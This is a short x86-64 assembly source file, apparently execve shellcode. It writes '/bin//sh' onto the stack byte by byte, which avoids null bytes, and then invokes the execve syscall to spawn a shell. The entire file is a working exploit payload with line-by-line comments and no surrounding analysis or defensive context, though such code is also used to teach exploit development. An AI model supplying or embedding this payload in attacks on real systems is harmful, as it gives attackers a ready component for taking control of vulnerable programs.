section .text
global _start

_start:
	xor esi, esi		    ; rsi = 0 (argv = NULL)
	xor edx, edx		    ; rdx = 0 (envp = NULL)

	push rsi		        ; push 8 bytes of null (string terminator)

	push 0x11111111		    ; allocate space safely

	mov byte [rsp+0], 0x2f	; "/"
	mov byte [rsp+1], 0x62	; "b"
	mov byte [rsp+2], 0x69	; "i"
	mov byte [rsp+3], 0x6e	; "n"
	mov byte [rsp+4], 0x2f	; "/"
	mov byte [rsp+5], 0x2f	; "/"
	mov byte [rsp+6], 0x73	; "s"
	mov byte [rsp+7], 0x68	; "h"

	lea rdi, [rsp]		    ; RDI now points to exactly "/bin//sh\0"
	push 0x3b		        ; execve syscall number
	pop rax			
	syscall
